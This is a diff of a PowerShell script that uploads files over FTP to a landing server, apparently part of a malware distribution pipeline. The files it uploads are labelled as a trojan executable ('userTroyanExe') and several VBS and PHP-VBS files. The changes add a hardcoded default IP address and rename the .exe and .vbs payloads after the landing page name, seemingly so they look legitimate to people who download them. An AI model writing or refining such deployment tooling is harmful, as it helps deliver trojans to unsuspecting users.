@@ -2,6 +2,11 @@ param (
     [string]$serverName
 )
 
+if ($serverName -eq "") {
+    $serverName = "185.247.141.125"
+    $action = "exe"
+} 
+
 if ([string]::IsNullOrEmpty($serverName)) {
         throw "-serverName argument is null"
 }
@@ -18,9 +23,9 @@ if ($server.landingAuto -eq $false)
 
 $ftpStorage=$server.landingFtp
 
-$files = @($server.userTroyanExe, $server.userTroyanExeMono, $server.userVbsFile, $server.userPhpVbsFile,$server.userSponsorPhpVbsFile,$server.userSponsorHtmlVbsFile)
+$files = @($server.userTroyanExe, $server.userVbsFile, $server.userPhpVbsFile, $server.userSponsorPhpVbsFile, $server.userSponsorHtmlVbsFile)
 
-$name = $server.landingName
+$landingName = $server.landingName
 
 function Create-FtpDirectory($ftpUrl, $ftpUsername, $ftpPassword, $directory) {
     $uri = New-Object System.Uri($ftpUrl + "/" + $directory)
@@ -69,7 +74,15 @@ Create-FtpDirectory -ftpUrl $ftpBaseUrl -ftpUsername $ftpUsername -ftpPassword $
 # Upload files with new names
 foreach ($file in $files) {
     if (Test-Path $file) {
-        $newFileName = [System.IO.Path]::GetFileName($file)
+        $ext =  [System.IO.Path]::GetExtension($file)
+        if ($ext -eq ".exe" -or $ext -eq ".vbs")
+        {
+            $newFileName = $landingName + $ext
+        }
+        else
+        {
+            $newFileName = [System.IO.Path]::GetFileName($file)
+        }
         Upload-FtpFile -ftpUrl $ftpStorage -ftpUsername $ftpUsername -ftpPassword $ftpPassword -filePath $file -newFileName $newFileName
     } else {
         Write-Host "File not found: $file"
